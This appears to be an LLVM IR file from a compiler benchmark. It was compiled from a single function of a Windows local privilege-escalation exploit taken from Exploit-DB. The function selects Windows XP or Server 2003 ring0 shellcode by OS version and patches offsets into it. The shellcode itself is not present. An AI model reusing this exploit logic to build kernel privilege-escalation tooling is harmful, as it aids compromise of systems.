; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_15972.c_fixup_ring0_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_15972.c_fixup_ring0_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [35 x i8] c"* GetVersion, unsupported version\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@win32_ret = common dso_local global i32* null, align 8
@winxp_ring0_shell = common dso_local global i32* null, align 8
@win2k3_ring0_shell = common dso_local global i32* null, align 8
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32* (i64, i32, i32*)* @fixup_ring0_shell to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32* @fixup_ring0_shell(i64 %0, i32 %1, i32* %2) #0 {
  %4 = alloca i32*, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i64 %0, i64* %5, align 8
  store i32 %1, i32* %6, align 4
  store i32* %2, i32** %7, align 8
  %11 = call i32 (...) @GetVersion()
  store i32 %11, i32* %8, align 4
  %12 = load i32, i32* %8, align 4
  %13 = call i32 @LOWORD(i32 %12)
  %14 = call i64 @LOBYTE(i32 %13)
  %15 = trunc i64 %14 to i32
  store i32 %15, i32* %9, align 4
  %16 = load i32, i32* %8, align 4
  %17 = call i32 @LOWORD(i32 %16)
  %18 = call i64 @HIBYTE(i32 %17)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %10, align 4
  %20 = load i32, i32* %9, align 4
  %21 = icmp ne i32 %20, 5
  br i1 %21, label %22, label %27

22:                                               ; preds = %3
  %23 = load i32, i32* @stderr, align 4
  %24 = call i32 @fprintf(i32 %23, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0))
  %25 = load i32, i32* @EXIT_FAILURE, align 4
  %26 = call i32 @exit(i32 %25) #3
  unreachable

27:                                               ; preds = %3
  %28 = load i64, i64* %5, align 8
  %29 = trunc i64 %28 to i32
  %30 = load i32*, i32** @win32_ret, align 8
  %31 = getelementptr inbounds i32, i32* %30, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = add nsw i32 %32, %29
  store i32 %33, i32* %31, align 4
  %34 = load i32, i32* %10, align 4
  switch i32 %34, label %47 [
    i32 1, label %35
    i32 2, label %41
  ]

35:                                               ; preds = %27
  %36 = load i32*, i32** %7, align 8
  store i32 7, i32* %36, align 4
  %37 = load i32, i32* %6, align 4
  %38 = load i32*, i32** @winxp_ring0_shell, align 8
  %39 = getelementptr inbounds i32, i32* %38, i64 55
  store i32 %37, i32* %39, align 4
  %40 = load i32*, i32** @winxp_ring0_shell, align 8
  store i32* %40, i32** %4, align 8
  br label %52

41:                                               ; preds = %27
  %42 = load i32*, i32** %7, align 8
  store i32 7, i32* %42, align 4
  %43 = load i32, i32* %6, align 4
  %44 = load i32*, i32** @win2k3_ring0_shell, align 8
  %45 = getelementptr inbounds i32, i32* %44, i64 58
  store i32 %43, i32* %45, align 4
  %46 = load i32*, i32** @win2k3_ring0_shell, align 8
  store i32* %46, i32** %4, align 8
  br label %52

47:                                               ; preds = %27
  %48 = load i32, i32* @stderr, align 4
  %49 = call i32 @fprintf(i32 %48, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0))
  %50 = load i32, i32* @EXIT_FAILURE, align 4
  %51 = call i32 @exit(i32 %50) #3
  unreachable

52:                                               ; preds = %41, %35
  %53 = load i32*, i32** %4, align 8
  ret i32* %53
}

declare dso_local i32 @GetVersion(...) #1

declare dso_local i64 @LOBYTE(i32) #1

declare dso_local i32 @LOWORD(i32) #1

declare dso_local i64 @HIBYTE(i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
